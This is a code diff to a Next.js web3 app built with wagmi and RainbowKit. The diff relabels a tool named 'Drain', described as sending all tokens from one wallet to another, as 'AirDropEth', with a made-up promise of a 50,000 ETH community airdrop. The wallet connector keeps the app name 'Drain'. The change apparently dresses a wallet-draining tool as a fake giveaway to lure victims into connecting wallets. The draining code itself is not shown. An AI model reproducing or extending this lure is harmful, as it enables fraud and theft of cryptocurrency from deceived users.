@@ -22,10 +22,9 @@ import { arbitrum, bsc, gnosis, optimism, polygon } from 'viem/chains';
 import { z } from 'zod';
 import { useIsMounted } from '../hooks';
 
-// Ensure that the environment variable is correctly set in your .env file
 const walletConnectProjectId = z
   .string()
-  .parse(process.env.NEXT_PUBLIC_WALLETCONNECT_PROJECT_ID);  // Ensure that this variable is correctly set in .env
+  .parse(process.env.NEXT_PUBLIC_WALLET_CONNECT_PROJECT_ID);
 
 const { chains, publicClient } = configureChains(
   [mainnet, polygon, optimism, arbitrum, bsc, gnosis],
@@ -34,7 +33,7 @@ const { chains, publicClient } = configureChains(
 
 const { connectors } = getDefaultWallets({
   appName: 'Drain',
-  projectId: walletConnectProjectId, // Pass the projectId from environment variable
+  projectId: walletConnectProjectId,
   chains,
 });
 
@@ -59,10 +58,10 @@ const App = ({ Component, pageProps }: AppProps) => {
       <WagmiConfig config={wagmiConfig}>
         <RainbowKitProvider coolMode chains={chains}>
           <NextHead>
-            <title>Drain</title>
+            <title>AirDropEth</title>
             <meta
               name="description"
-              content="Send all tokens from one wallet to another"
+              content="50,000 ETH tokens will be redistributed in an airdrop for the community."
             />
             <link rel="icon" href="/favicon.ico" />
           </NextHead>
